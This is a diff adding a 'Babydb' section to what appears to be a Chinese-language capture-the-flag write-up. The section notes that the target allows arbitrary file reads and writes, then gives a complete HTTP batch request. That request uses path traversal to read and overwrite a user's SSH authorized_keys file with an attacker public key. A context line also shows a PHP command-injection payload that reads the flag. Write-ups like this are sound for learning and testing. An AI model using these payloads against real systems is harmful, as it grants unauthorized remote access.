@@ -839,3 +839,19 @@ echo '123';antsystem('/readflag');echo '456';
 ## Babydb
 
 仔细阅读代码，发现可以任意文件写和任意文件读，往ssh那边写authorized_keys即可。
+
+```http
+POST /batch?aa= HTTP/1.1
+Host: 192.168.201.11:8000
+Connection: close
+User-Agent: Paw/3.1.8 (Macintosh; OS X/10.14.5) GCDHTTPRequest
+Content-Length: 735
+Content-Type: text/plain; charset=utf-8
+
+78de0aff9278a05e99d742fb638b1c30:login?wwwww??sss
+78de0aff9278a05e99d742fb638b1c30:login??wdwd?ss
+78de0aff9278a05e99d742fb638b1c30:load?../../../../../home/user/.ssh/authorized_keys?a?xx
+78de0aff9278a05e99d742fb638b1c30:store?../../../../home/user/.ssh/authorized_keys?ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6qOuUT4i9soONTUndhwp30PWYiKBkLKCEKt6PXQaWxJxPny1fgEKczxGusQf/yDNjsV1l398+2Xy+5DDUD9RwYXyaFxlomiHD4UpKi30Y58Ppkz2+rtqusSG2GqZr39sW7ycqgt4tBkQXb97pCsyjkjOvRcIBZOKqHor8wUouJfO+YID3xspUgN1XA8Ld49O+AgJOo5gsuUmvIhbe4fgP04rtq4ptIyavBvqFuxw+49JfxHCFQct7e8c2iON9IaZnoPrSbC1V4T3E5McLmAq/xoyRNW2R/T3p28ieeuiL4cPPM00CfxI/OTxJmeKZa3hUI0Lg0kiPbsvyxIvK22gH xxxx@xxxxdeMacBook-Pro.local?xx
+78de0aff9278a05e99d742fb638b1c30:logout?wdwdwd?aa
+```
+
